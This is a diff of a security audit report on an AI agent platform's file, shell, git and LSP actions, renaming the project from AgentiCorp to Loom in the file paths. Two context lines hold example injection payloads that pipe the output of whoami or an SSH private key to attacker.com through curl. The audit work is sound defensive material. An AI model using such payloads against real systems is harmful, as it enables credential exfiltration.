@@ -28,7 +28,7 @@ This security audit examined the new action capabilities introduced in Epic 4, f
 
 ### 1.1 File Operations - Path Traversal Protection (MEDIUM)
 
-**Location:** `/Users/jkh/Src/AgentiCorp/internal/files/manager.go:330-346`
+**Location:** `/Users/jkh/Src/Loom/internal/files/manager.go:330-346`
 
 **Finding:**
 The `safeJoin` function provides path traversal protection by:
@@ -79,7 +79,7 @@ safeJoin("/app/projects/proj1", "../../proj2/secrets")  // May access other proj
 
 ### 1.2 File Operations - Missing Implementation for File Management Actions (CRITICAL)
 
-**Location:** `/Users/jkh/Src/AgentiCorp/internal/actions/router.go:689-729`
+**Location:** `/Users/jkh/Src/Loom/internal/actions/router.go:689-729`
 
 **Finding:**
 The `ActionMoveFile`, `ActionDeleteFile`, and `ActionRenameFile` actions have placeholder implementations that return success without performing security checks:
@@ -166,7 +166,7 @@ case ActionMoveFile:
 
 ### 1.3 Git Apply Patch - Indirect Path Traversal (MEDIUM)
 
-**Location:** `/Users/jkh/Src/AgentiCorp/internal/files/manager.go:247-265`
+**Location:** `/Users/jkh/Src/Loom/internal/files/manager.go:247-265`
 
 **Finding:**
 The `ApplyPatch` function uses `git apply` which can modify files based on patch content. While `git apply` runs in the project directory, malicious patches could potentially target files outside the project.
@@ -205,7 +205,7 @@ func (m *Manager) ApplyPatch(ctx context.Context, projectID, patch string) (*Pat
 
 ### 2.1 Shell Executor - Direct Command Injection (CRITICAL)
 
-**Location:** `/Users/jkh/Src/AgentiCorp/internal/executor/shell_executor.go:92`
+**Location:** `/Users/jkh/Src/Loom/internal/executor/shell_executor.go:92`
 
 **Finding:**
 The shell executor passes user-controlled commands directly to `/bin/sh -c`, allowing arbitrary command execution with shell interpretation.
@@ -274,7 +274,7 @@ func (e *ShellExecutor) ExecuteCommand(ctx context.Context, req ExecuteCommandRe
 
 ### 2.2 Test Runner - Framework Detection Command Injection (LOW)
 
-**Location:** `/Users/jkh/Src/AgentiCorp/internal/testing/runner.go:216-220`
+**Location:** `/Users/jkh/Src/Loom/internal/testing/runner.go:216-220`
 
 **Finding:**
 The `BuildCommand` function uses `strings.Fields()` to parse custom commands, which could allow command injection if the custom command contains shell metacharacters.
@@ -299,7 +299,7 @@ func (r *TestRunner) BuildCommand(framework, projectPath, pattern, customCommand
 
 ### 2.3 Git Operations - SSH Command Injection (HIGH)
 
-**Location:** `/Users/jkh/Src/AgentiCorp/internal/gitops/gitops.go:415`
+**Location:** `/Users/jkh/Src/Loom/internal/gitops/gitops.go:415`
 
 **Finding:**
 The GIT_SSH_COMMAND environment variable construction includes user-controlled paths without proper escaping.
@@ -308,7 +308,7 @@ The GIT_SSH_COMMAND environment variable construction includes user-controlled p
 ```go
 cmd.Env = append(cmd.Env,
     "GIT_TERMINAL_PROMPT=0",
-    fmt.Sprintf("GIT_SSH_COMMAND=ssh -i %s -o IdentitiesOnly=yes -o UserKnownHostsFile=/home/agenticorp/.ssh/known_hosts", sshKeyPath),
+    fmt.Sprintf("GIT_SSH_COMMAND=ssh -i %s -o IdentitiesOnly=yes -o UserKnownHostsFile=/home/loom/.ssh/known_hosts", sshKeyPath),
 )
 ```
 
@@ -332,7 +332,7 @@ sshKeyPath = "/path/to/test; curl http://attacker.com/exfil?data=$(whoami)/ssh/i
 
 ### 3.1 Git Commit - Command Argument Injection (HIGH)
 
-**Location:** `/Users/jkh/Src/AgentiCorp/internal/gitops/gitops.go:231-234`
+**Location:** `/Users/jkh/Src/Loom/internal/gitops/gitops.go:231-234`
 
 **Finding:**
 Commit message and author information are passed to git without proper escaping, potentially allowing command injection through git hooks or command arguments.
@@ -365,7 +365,7 @@ message = "feat: update\n\n$(curl http://attacker.com/exfil?data=$(cat ~/.ssh/id
 
 ### 3.2 Git Service - Branch Name Validation (MEDIUM)
 
-**Location:** `/Users/jkh/Src/AgentiCorp/internal/git/service.go:468-483`
+**Location:** `/Users/jkh/Src/Loom/internal/git/service.go:468-483`
 
 **Finding:**
 Branch name validation is implemented but could be stricter.
@@ -422,7 +422,7 @@ func validateBranchName(branchName string) error {
 
 ### 3.3 Git Push - Protected Branch Bypass (MEDIUM)
 
-**Location:** `/Users/jkh/Src/AgentiCorp/internal/git/service.go:210-214`
+**Location:** `/Users/jkh/Src/Loom/internal/git/service.go:210-214`
 
 **Finding:**
 Protected branch checking uses pattern matching but could be bypassed with case variations or branch name tricks.
@@ -454,7 +454,7 @@ var protectedBranchPatterns = []string{
 
 ### 3.4 Git Service - Force Push Blocked (LOW - GOOD)
 
-**Location:** `/Users/jkh/Src/AgentiCorp/internal/git/service.go:217-220`
+**Location:** `/Users/jkh/Src/Loom/internal/git/service.go:217-220`
 
 **Finding:**
 Force push is correctly blocked with no bypass mechanism.
@@ -477,7 +477,7 @@ if req.Force {
 
 ### 4.1 LSP Service - Language Server Command Injection (MEDIUM)
 
-**Location:** `/Users/jkh/Src/AgentiCorp/internal/lsp/service.go:142-158`
+**Location:** `/Users/jkh/Src/Loom/internal/lsp/service.go:142-158`
 
 **Finding:**
 Language server startup uses hardcoded commands, but file path parameters are not validated.
@@ -520,7 +520,7 @@ While commands are hardcoded (good!), the `projectPath` could potentially be pas
 
 ### 4.2 LSP File Path Validation (MEDIUM)
 
-**Location:** `/Users/jkh/Src/AgentiCorp/internal/lsp/service.go:46-62`
+**Location:** `/Users/jkh/Src/Loom/internal/lsp/service.go:46-62`
 
 **Finding:**
 LSP operations accept file paths without validation before passing to language servers.
@@ -547,7 +547,7 @@ func (s *LSPService) FindReferences(ctx context.Context, req FindReferencesReque
 
 ### 5.1 Edit Code - Git Apply Injection (HIGH)
 
-**Location:** `/Users/jkh/Src/AgentiCorp/internal/actions/router.go:168-184`
+**Location:** `/Users/jkh/Src/Loom/internal/actions/router.go:168-184`
 
 **Finding:**
 The `ActionEditCode` uses `ApplyPatch` which runs `git apply` with user-controlled patch content. Malicious patches could exploit git vulnerabilities or modify unexpected files.
@@ -637,7 +637,7 @@ func (m *Manager) ApplyPatch(ctx context.Context, projectID, patch string) (*Pat
 
 ### 5.2 Refactoring Actions - No Implementation (LOW)
 
-**Location:** `/Users/jkh/Src/AgentiCorp/internal/actions/router.go:653-688`
+**Location:** `/Users/jkh/Src/Loom/internal/actions/router.go:653-688`
 
 **Finding:**
 Refactoring actions (`extract_method`, `rename_symbol`, `inline_variable`) return success without performing operations.
@@ -656,7 +656,7 @@ When implementing these actions:
 
 ### 6.1 Secret Detection - Pattern-Based (MEDIUM)
 
-**Location:** `/Users/jkh/Src/AgentiCorp/internal/git/service.go:457-464`
+**Location:** `/Users/jkh/Src/Loom/internal/git/service.go:457-464`
 
 **Finding:**
 Secret detection uses regex patterns which can have false positives/negatives.
@@ -693,7 +693,7 @@ var secretPatterns = []*regexp.Regexp{
 
 ### 7.1 Build Runner - Gradle Execution (MEDIUM)
 
-**Location:** `/Users/jkh/Src/AgentiCorp/internal/build/runner.go:220`
+**Location:** `/Users/jkh/Src/Loom/internal/build/runner.go:220`
 
 **Finding:**
 Build runner executes `./gradlew` which could be a malicious script if project is compromised.
@@ -715,7 +715,7 @@ case "gradle":
 
 ### 7.2 File Size Limits (LOW - GOOD)
 
-**Location:** `/Users/jkh/Src/AgentiCorp/internal/files/manager.go:16-19`
+**Location:** `/Users/jkh/Src/Loom/internal/files/manager.go:16-19`
 
 **Finding:**
 File operations have appropriate size limits defined.
@@ -738,7 +738,7 @@ const (
 
 ### 7.3 Blocked Path Protection (LOW - GOOD)
 
-**Location:** `/Users/jkh/Src/AgentiCorp/internal/files/manager.go:349-355`
+**Location:** `/Users/jkh/Src/Loom/internal/files/manager.go:349-355`
 
 **Finding:**
 `.git` directory access is explicitly blocked.
